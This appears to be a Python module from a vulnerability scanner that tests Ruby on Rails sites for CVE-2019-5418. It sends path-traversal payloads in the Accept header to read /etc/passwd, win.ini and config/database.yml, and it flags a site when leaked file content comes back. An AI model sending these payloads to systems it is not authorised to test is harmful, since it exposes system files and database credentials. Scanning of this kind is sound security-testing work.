import asyncio
from modules.core import console

# Ruby on Rails Scanner (Framework Vulnerability)
# Focus: CVE-2019-5418 (File Content Disclosure).
# Method: Inject "../../../../../etc/passwd{{" into Accept header.

RAILS_PAYLOADS = [
    "../../../../../../../../etc/passwd{{",
    "../../../../../../../../windows/win.ini{{",
    "../../../../../../../../config/database.yml{{"
]

async def check_rails(session, url):
    try:
        # Heuristic: Check for Rails headers/cookies first?
        # Cookie: _session_id, X-Runtime header.
        
        target = url
        
        for payload in RAILS_PAYLOADS:
            headers = {
                "Accept": payload
            }
            
            async with session.get(target, headers=headers, timeout=5, ssl=False) as resp:
                text = await resp.text()
                
                # Indicators
                if "root:x:0:0" in text:
                     return {
                        "url": target,
                        "type": "Rails File Disclosure (CVE-2019-5418)",
                        "evidence": "/etc/passwd leaked via Accept header."
                    }
                elif "[extensions]" in text or "for 16-bit app support" in text:
                     return {
                        "url": target,
                        "type": "Rails File Disclosure (CVE-2019-5418)",
                        "evidence": "win.ini leaked via Accept header."
                    }

    except Exception:
        pass
    return None

async def scan_rails(session, url):
    """
    Scan for Ruby on Rails Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- Ruby on Rails Scanner ---[/bold cyan]")
    
    results = []
    res = await check_rails(session, url)
    if res:
         console.print(f"  [bold red][!] RAILS VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Evidence: {res['evidence']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No Rails file disclosure indicators found.[/dim]")
        
    return results
